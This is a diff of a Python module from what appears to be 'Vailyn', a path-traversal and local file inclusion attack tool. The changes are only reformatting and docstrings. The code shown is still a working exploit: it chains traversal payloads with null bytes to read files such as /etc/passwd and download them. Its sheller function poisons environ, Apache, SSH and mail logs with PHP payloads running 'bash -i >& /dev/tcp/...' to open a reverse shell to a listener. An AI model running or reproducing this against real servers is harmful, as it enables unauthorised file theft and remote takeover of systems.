@@ -2,16 +2,16 @@
 # -*- coding: utf-8 -*-
 """
 _____, ___
-   '+ .;    
-    , ;   
-     .   
-           
-       .    
-     .;.    
-     .;  
-      :  
-      ,   
-       
+   '+ .;
+    , ;
+     .
+
+       .
+     .;.
+     .;
+      :
+      ,
+
 
 ┌─[Vailyn]─[~]
 └──╼ VainlyStrain
@@ -19,11 +19,13 @@ _____, ___
 
 
 import multiprocessing
+import requests
+import sys
+import subprocess
 
 import core.variables as vars
 
 from core.methods.session import session, random_ua
-import requests, sys, subprocess
 from core.colors import color
 from core.variables import payloadlist, nullchars, LISTENIP, LISTENPORT
 from core.methods.filecheck import filecheck
@@ -39,8 +41,11 @@ requestcount = 0
 
 lock = multiprocessing.Lock()
 
-"""reset the request counter"""
+
 def resetCounter():
+    """
+    reset the request counter
+    """
     lock.acquire()
     try:
         global requestcount
@@ -49,52 +54,54 @@ def resetCounter():
         lock.release()
 
 
-"""prepare request for inpath attack"""
 def inpath(traverse, dir, file, nb, url, url2, s):
-    path=traverse+dir+file+nb+url2
-    p = traverse+dir+file+nb
+    """
+    prepare request for inpath attack
+    """
+    path = traverse + dir + file + nb + url2
+    p = traverse + dir + file + nb
     req = requests.Request(method='GET', url=url)
-    #prep = req.prepare()
     prep = s.prepare_request(req)
     prep.url = url + path
     return (prep, p)
 
-"""prepare request for query attack"""
+
 def query(traverse, dir, file, nb, keyword, url, url2, s):
+    """
+    prepare request for query attack
+    """
     if "?" not in url:
         query = "?" + keyword + "=" + traverse + dir + file + nb + url2
     else:
         query = "&" + keyword + "=" + traverse + dir + file + nb + url2
     p = traverse + dir + file + nb
     req = requests.Request(method='GET', url=url)
-    #prep = req.prepare()
     prep = s.prepare_request(req)
     prep.url = url + query
     return (prep, p)
 
 
-"""
-[Phase 1]: Vulnerability Analysis
-
-@attack: attack mode (-a ACK)
-@url: target part 1 (-v VIC)
-@url2: target part 2 (-q VIC2)
-@keyword: -p PAM (only for -a 1)
-@cookie: cookiejar for -a 3
-@selected: selected cookie to be poisoned
-@verbose: print 404s?
-@depth: attack depth (-d INT)
-@paylist: payload list (all)
-@file: file to be looked up (-i FIL, default: /etc/passwd)
-@authcookie: Authentication Cookie File to bypass Login Screens
-@postdata: POST Data for --attack 4
-@gui: GUI frame to set the graphical progress bar
-"""
-def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie, 
-    postdata, gui):
-    #variables for the progress counter
+def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie,
+           postdata, gui):
+    """
+    [Phase 1]: Vulnerability Analysis
+    @params:
+        attack     - attack mode (-a ACK)
+        url        - target part 1 (-v VIC)
+        url2       - target part 2 (-q VIC2)
+        keyword    - -p PAM (only for -a 1)
+        cookie     - cookiejar for -a 3
+        selected   - selected cookie to be poisoned
+        verbose    - print 404s?
+        depth      - attack depth (-d INT)
+        paylist    - payload list (all)
+        file       - file to be looked up (-i FIL, default: /etc/passwd)
+        authcookie - Authentication Cookie File to bypass Login Screens
+        postdata   - POST Data for --attack 4
+        gui        - GUI frame to set the graphical progress bar
+    """
+    # variables for the progress counter
     global requestcount
-    #totalrequests = len(paylist) * (len(nullchars) + 1) * depth
     totalrequests = len(payloadlist) * (len(nullchars) + 1) * (depth)
     timeout = vars.timeout
     if gui:
@@ -106,20 +113,20 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         finally:
             lock.release()
 
-    #resolve issues with inpath attack
+    # resolve issues with inpath attack
     if attack == 2:
-        #only root directory, else false positives
+        # only root directory, else false positives
         splitted = url.split("://")
         ulist = splitted[1].split("/")
         last = ulist[-1]
-        #delete file, but not hidden directory
+        # delete file, but not hidden directory
         if "." in last and not last.startswith("."):
             del ulist[-1]
         url = splitted[0] + "://" + "/".join(ulist)
     if not url.endswith("/"):
         url += "/"
 
-    #initialize lists & session
+    # initialize lists & session
     payloads = []
     nullbytes = []
     s = session()
@@ -129,7 +136,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    #initial ping for filecheck
+    # initial ping for filecheck
     if attack != 4:
         try:
             con2 = s.get(url, timeout=timeout).content
@@ -152,13 +159,13 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         d = 1
         while d <= depth:
             traverse=''
-            j=1
-            #chain traversal payloads
+            j = 1
+            # chain traversal payloads
             while j <= d:
-                traverse+=i
-                j+=1
+                traverse += i
+                j += 1
 
-            #send attack requests - no nullbyte injection
+            # send attack requests - no nullbyte injection
             requestlist = []
             if attack == 1:
                 prep, p = query(traverse, "", file, "", keyword, url, url2, s)
@@ -198,10 +205,10 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                     print("Timeout reached for " + url)
             try:
                 requestlist.append((r, p, ""))
-            except:
+            except Exception:
                 pass
 
-            #repeat for nullbytes
+            # repeat for nullbytes
             for nb in nullchars:
                 if attack == 1:
                     prep, p = query(traverse, "", file, nb, keyword, url, url2, s)
@@ -245,10 +252,10 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                         continue
                 try:
                     requestlist.append((r, p, nb))
-                except:
+                except Exception:
                     pass
 
-            #analyze result
+            # analyze result
             found = False
             for (r, p, nb) in requestlist:
                 lock.acquire()
@@ -283,33 +290,34 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             d+=1
             if found:
                 break
-    
+
     return (payloads, nullbytes)
 
-"""
-[Phase 2]: Exploitation
 
-@attack: attack mode (-a ACK)
-@url: target part 1 (-v VIC)
-@url2: target part 2 (-q VIC2)
-@keyword: -p PAM (only for -a 1)
-@cookie: cookiejar for -a 3
-@selected: selected cookie to be poisoned
-@files: file list created from -l FIL ...
-@dirs: directory list (permutation level based on -d INT)
-@depth: attack depth (-d INT)
-@verbose: print 404s?
-@dl: download found files?
-@selected_payloads: payloads selected in phase 1
-@selected_nullbytes: terminators selected in phase 1
-@authcookie: Authentication Cookie File to bypass Login Screens
-@postdata: POST Data for --attack 4
-@dirlen: total directory dictionary size (after permutations)
-@gui: GUI frame to set the graphical progress bar
-"""
-def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth, verbose, dl, 
-    selected_payloads, selected_nullbytes, authcookie, postdata, dirlen, gui):
-    #variables for the progress counter
+def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth, verbose, dl,
+           selected_payloads, selected_nullbytes, authcookie, postdata, dirlen, gui):
+    """
+    [Phase 2]: Exploitation
+    @params:
+        attack             - attack mode (-a ACK)
+        url                - target part 1 (-v VIC)
+        url2               - target part 2 (-q VIC2)
+        keyword            - -p PAM (only for -a 1)
+        cookie             - cookiejar for -a 3
+        selected           - selected cookie to be poisoned
+        files              - file list created from -l FIL ...
+        dirs               - directory list (permutation level based on -d INT)
+        depth              - attack depth (-d INT)
+        verbose            - print 404s?
+        dl                 - download found files?
+        selected_payloads  - payloads selected in phase 1
+        selected_nullbytes - terminators selected in phase 1
+        authcookie         - Authentication Cookie File to bypass Login Screens
+        postdata           - POST Data for --attack 4
+        dirlen             - total directory dictionary size (after permutations)
+        gui                - GUI frame to set the graphical progress bar
+    """
+    # variables for the progress counter
     global requestcount
     timeout = vars.timeout
     fileslen = sum(1 for dummy in filegen(filespath))
@@ -327,20 +335,20 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         finally:
             lock.release()
 
-    #resolve issues with inpath attack and loot function
+    # resolve issues with inpath attack and loot function
     if attack == 2:
-        #only root directory, else false positives
+        # only root directory, else false positives
         splitted = url.split("://")
         ulist = splitted[1].split("/")
         last = ulist[-1]
-        #delete file, but not hidden directory
+        # delete file, but not hidden directory
         if "." in last and not last.startswith("."):
             del ulist[-1]
         url = splitted[0] + "://" + "/".join(ulist)
     if not url.endswith("/"):
         url += "/"
 
-    #initialize lists & session
+    # initialize lists & session
     found=[]
     urls = []
     s = session()
@@ -350,7 +358,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    #initial ping for filecheck
+    # initial ping for filecheck
     if attack != 4:
         try:
             con2 = s.get(url, timeout=timeout).content
@@ -373,17 +381,17 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         for dir in dirs:
             files = filegen(filespath)
             for file in files:
-                d=1
+                d = 1
                 while d <= depth:
                     for i in selected_payloads:
                         traverse=''
-                        j=1
-                        #chain traversal payloads
+                        j = 1
+                        # chain traversal payloads
                         while j <= d:
-                            traverse+=i
-                            j+=1
+                            traverse += i
+                            j += 1
 
-                        #send attack requests - with or without nullbyte injection
+                        # send attack requests - with or without nullbyte injection
                         requestlist = []
                         if selected_nullbytes == []:
                             data = {}
@@ -412,7 +420,6 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
                                     continue
-                                #print(s.cookies)
                             elif attack == 4:
                                 p = traverse + dir + file
                                 for prop in postdata.split("&"):
@@ -429,7 +436,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                                     continue
                             try:
                                 requestlist.append((r, p, data))
-                            except:
+                            except Exception:
                                 pass
                         else:
                             for nb in selected_nullbytes:
@@ -475,10 +482,10 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                                         continue
                                 try:
                                     requestlist.append((r, p, data))
-                                except:
+                                except Exception:
                                     pass
 
-                        #analyze result
+                        # analyze result
                         for (r, p, data) in requestlist:
                             lock.acquire()
                             try:
@@ -496,78 +503,80 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
 
                             vfound = False
                             if str(r.status_code).startswith("2"):
-                                if (filecheck(r, con2, con3, p) and attack != 4 
-                                  or filecheck(r, con2, con3, p, post=True) and attack == 4):
+                                if (filecheck(r, con2, con3, p) and attack != 4
+                                    or filecheck(r, con2, con3, p, post=True) and attack == 4):
                                     vfound = True
                                     if attack == 1 or attack == 2:
                                         print(color.RD+"[INFO]" + color.O + " leak" + color.END + "       "
-                                        + color.RD + "statvs-code" + color.END + "=" + color.O + str(r.status_code)
-                                        + color.END + " " + color.R + "site" + color.END + "=" + r.url)
+                                              + color.RD + "statvs-code" + color.END + "=" + color.O + str(r.status_code)
+                                              + color.END + " " + color.R + "site" + color.END + "=" + r.url)
 
-                                        if dl and dir+file not in found:
+                                        if dl and dir + file not in found:
                                             download(r.url, dir+file, cookie=s.cookies)
-                                        found.append(dir+file)
+                                        found.append(dir + file)
                                         if attack == 1:
-                                            urls.append(color.RD + "[pl]" + color.END + color.O + " " 
-                                            +  str(r.status_code) + color.END + " " 
-                                            + r.url.split(keyword+"=")[1].replace(url2, ""))
+                                            urls.append(color.RD + "[pl]" + color.END + color.O + " "
+                                                        +  str(r.status_code) + color.END + " "
+                                                        + r.url.split(keyword+"=")[1].replace(url2, ""))
                                         else:
                                             vlnlist = r.url.split("/")[1::]
                                             vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
-                                            urls.append(color.RD + "[pl]" + color.END + color.O + " " 
-                                            +  str(r.status_code) + color.END + " " + vlnpath)
+                                            urls.append(color.RD + "[pl]" + color.END + color.O + " "
+                                                        +  str(r.status_code) + color.END + " " + vlnpath)
                                     elif attack == 3:
                                         s.cookies.set(selected, p)
-                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END + 
-                                        "       " + color.RD + "statvs-code" + color.END + "=" + color.O 
-                                        + str(r.status_code) + color.END + " " + color.R + "cookie" + 
-                                        color.END + "=" + p)
+                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END +
+                                              "       " + color.RD + "statvs-code" + color.END + "=" + color.O
+                                              + str(r.status_code) + color.END + " " + color.R + "cookie" +
+                                              color.END + "=" + p)
 
-                                        if dl and dir+file not in found:
+                                        if dl and dir + file not in found:
                                             download(r.url, dir+file, cookie=s.cookies)
-                                        found.append(dir+file)
-                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  
-                                        str(r.status_code) + color.END + " " + p)
+                                        found.append(dir + file)
+                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +
+                                                    str(r.status_code) + color.END + " " + p)
                                     elif attack == 4:
-                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END + 
-                                        "       " + color.RD + "statvs-code" + color.END + "=" + color.O 
-                                        + str(r.status_code) + color.END + " " + color.R + "postdata" 
-                                        + color.END + "=" + p)
+                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END +
+                                              "       " + color.RD + "statvs-code" + color.END + "=" + color.O
+                                              + str(r.status_code) + color.END + " " + color.R + "postdata"
+                                              + color.END + "=" + p)
 
-                                        if dl and dir+file not in found:
+                                        if dl and dir + file not in found:
                                             download(r.url, dir + file, cookie=s.cookies, post=data)
-                                        found.append(dir+file)
-                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " 
-                                        +  str(r.status_code) + color.END + " " + p)
-                            
+                                        found.append(dir + file)
+                                        urls.append(color.RD + "[pl]" + color.END + color.O + " "
+                                                    +  str(r.status_code) + color.END + " " + p)
+
                             if verbose and not vfound:
                                 if attack == 1 or attack == 2:
                                     print(color.END + "{}|: ".format(r.status_code)+r.url)
                                 elif attack == 3 or attack == 4:
                                     print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
-                    d+=1
+                    d += 1
         return (found, urls)
     except KeyboardInterrupt:
         return (found, urls)
 
-"""
-second exploitation module: try to gain a reverse shell over the system
-@technique:
-1) /proc/self/environ User-agent poisoning
-2) Apache log poisoning
-3) SSH log poisoning
-4) Poisoned mail to web user
-@others: see phase1()
-"""
-def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, 
-    authcookie, postdata):
-    #resolve issues with inpath attack
+
+def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
+            authcookie, postdata):
+    """
+    second exploitation module: try to gain a reverse shell over the system
+    @params:
+        technique:
+        1) /proc/self/environ User-agent poisoning
+        2) Apache log poisoning
+        3) SSH log poisoning
+        4) Poisoned mail to web user
+        others - see phase1()
+    """
+    # resolve issues with inpath attack
     if attack == 2:
-        #only root directory, else false positives
+        # only root directory, else false positives
         splitted = url.split("://")
         ulist = splitted[1].split("/")
         last = ulist[-1]
-        #delete file, but not hidden directory
+        # delete file, but not hidden directory
         if "." in last and not last.startswith("."):
             del ulist[-1]
         url = splitted[0] + "://" + "/".join(ulist)
@@ -586,7 +595,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         file = "/var/log/auth.log"
     elif technique == 4:
         file = "/var/mail/www-data"
-    
+
     success = None
 
     if authcookie != "":
@@ -594,7 +603,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    #initial ping for filecheck
+    # initial ping for filecheck
     if attack != 4:
         try:
             con2 = s.get(url, timeout=timeout).content
@@ -616,14 +625,14 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
     for i in paylist:
         d = 1
         while d <= depth:
-            traverse=''
-            j=1
-            #chain traversal payloads
+            traverse = ''
+            j = 1
+            # chain traversal payloads
             while j <= d:
-                traverse+=i
-                j+=1
+                traverse += i
+                j += 1
 
-            #send attack requests - no nullbyte injection
+            # send attack requests - no nullbyte injection
             requestlist = []
             if nullist == []:
                 data = {}
@@ -664,7 +673,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         print("Timeout reached for " + url)
                 try:
                     requestlist.append((r, p, "", data, traverse))
-                except:
+                except Exception:
                     pass
             else:
                 for nb in nullist:
@@ -710,11 +719,10 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             continue
                     try:
                         requestlist.append((r, p, "", data, traverse))
-                    except:
+                    except Exception:
                         pass
 
-
-            #analyze result
+            # analyze result
             found = False
             for (r, p, nb, data, traverse) in requestlist:
                 if attack == 3:
@@ -729,11 +737,10 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         print(color.END + "{}|: ".format(r.status_code)+r.url)
                     elif attack == 3 or attack == 4:
                         print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
-            d+=1
+            d += 1
             if found:
                 break
 
-    
     if success:
         if attack == 1:
             prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
@@ -791,8 +798,8 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 tmp = tmp.split("@")[1]
             host = tmp.split("/")[0].split(":")[0]
             sshs = ['<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
-            '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
-            '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
+                    '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
+                    '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
             for ssh in sshs:
                 try:
                     if sys.platform.lower().startswith("win"):
@@ -809,9 +816,9 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             tmp = url.split("://")[1]
             if "@" in tmp:
                 tmp = tmp.split("@")[1]
-            topics = ['I<3shells <?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT), 
-            'I<3shells <?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT), 
-            'I<3shells <?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)]
+            topics = ['I<3shells <?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
+                      'I<3shells <?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
+                      'I<3shells <?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)]
             host = tmp.split("/")[0].split(":")[0]
             for topic in topics:
                 try:
@@ -825,8 +832,12 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 print("Timeout reached @technique 4")
 
 
-"""invoke sheller() for each technique"""
 def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
+    """
+    invoke sheller() for each technique
+    @params:
+        (see other methods)
+    """
     for technique in range(1, 5):
-        sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, 
-        authcookie, postdata)
+        sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
+                authcookie, postdata)
